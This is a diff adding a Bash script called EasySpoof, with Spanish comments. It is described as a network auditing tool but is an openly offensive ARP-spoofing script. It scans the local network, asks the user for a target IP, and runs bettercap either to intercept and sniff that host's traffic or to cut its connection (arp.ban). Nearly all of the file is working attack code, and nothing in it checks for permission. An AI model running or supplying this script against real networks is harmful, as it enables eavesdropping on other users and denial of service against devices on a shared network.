@@ -1,0 +1,92 @@
+#!/bin/bash
+
+# ==============================================================================
+# Tool: EasySpoof v1.0
+# Description: Advanced Network Auditing & ARP Analysis Tool.
+# Author: Hacknet
+# ==============================================================================
+
+# Definición de Colores (Hacknet Theme)
+cyan="\e[0;36m\033[1m"
+green="\e[0;32m\033[1m"
+red="\e[0;31m\033[1m"
+yellow="\e[0;33m\033[1m"
+white="\e[0;37m"
+end="\033[0m\e[0m"
+
+# Función de salida controlada
+trap ctrl_c INT
+
+function ctrl_c(){
+    echo -e "\n\n${red}[!] Interrupción detectada. Limpiando caché ARP y cerrando...${end}"
+    tput cnorm # Restaurar cursor
+    exit 0
+}
+
+function print_banner(){
+    clear
+    echo -e "${cyan}"
+    echo "  ███████╗ █████╗ ███████╗██╗   ██╗███████╗██████╗  ██████╗  ██████╗ ███████╗"
+    echo "  ██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝"
+    echo "  █████╗  ███████║███████╗ ╚████╔╝ ███████╗██████╔╝██║   ██║██║   ██║█████╗  "
+    echo "  ██╔══╝  ██╔══██║╚════██║  ╚██╔╝  ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  "
+    echo "  ███████╗██║  ██║███████║   ██║   ███████║██║     ╚██████╔╝╚██████╔╝██║     "
+    echo "  ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     "
+    echo -e "${end}"
+    echo -e "${white}        [ By: Hacknet | v1.0 ]${end}"
+    echo -e "${cyan}-------------------------------------------------------------------------${end}\n"
+}
+
+# --- [ Gestión de Dependencias ] ---
+function check_env(){
+    local tools=(bettercap arp-scan)
+    echo -e "${white}[*]${end} Verificando entorno de ejecución..."
+    
+    for tool in "${tools[@]}"; do
+        if ! command -v $tool &> /dev/null; then
+            echo -e "  ${yellow}[!]${end} $tool no instalado. Configurando automáticamente..."
+            sudo apt-get update && sudo apt-get install $tool -y > /dev/null 2>&1
+        else
+            echo -e "  ${green}[✔]${end} $tool configurado correctamente."
+        fi
+    done
+    echo -e "\n${green}[+] Entorno listo.${end}\n"
+}
+
+# --- [ Lógica de Interceptación ] ---
+function run_module(){
+    echo -e "${cyan}[i]${end} Escaneando segmento local en busca de nodos activos..."
+    sudo arp-scan -l | grep -E '([a-f0-9]{2}:){5}[a-f0-9]{2}' > .net_map
+    
+    if [ ! -s .net_map ]; then
+        echo -e "${red}[!] Error: No se encontraron dispositivos en la red.${end}"
+        rm .net_map; exit 1
+    fi
+    
+    cat .net_map; rm .net_map
+
+    echo -e "\n${white}[?]${end} Dirección IP del objetivo:"
+    read ip_target
+    
+    echo -e "\n${cyan}[Módulos de Ataque]${end}"
+    echo -e "  1. Full Sniffer (Interceptación de paquetes)"
+    echo -e "  2. Network Denial (Cortar conexión)"
+    read -p "Seleccione módulo: " op
+
+    tput civis # Ocultar cursor para enfoque profesional
+
+    if [ "$op" == "1" ]; then
+        echo -e "\n${green}[*]${end} Módulo Sniffer activo sobre ${white}$ip_target${end}..."
+        sudo bettercap -eval "set arp.spoof.targets $ip_target; set arp.spoof.internal true; arp.spoof on; net.sniff on; events.ignore net.sniff.mdns"
+    elif [ "$op" == "2" ]; then
+        echo -e "\n${red}[*]${end} Módulo Denial activo sobre ${white}$ip_target${end}..."
+        sudo bettercap -eval "set arp.spoof.targets $ip_target; set arp.spoof.internal true; arp.ban on"
+    else
+        echo -e "${red}[!] Módulo inválido.${end}"; tput cnorm; exit 1
+    fi
+}
+
+# Ejecución secuencial
+print_banner
+check_env
+run_module
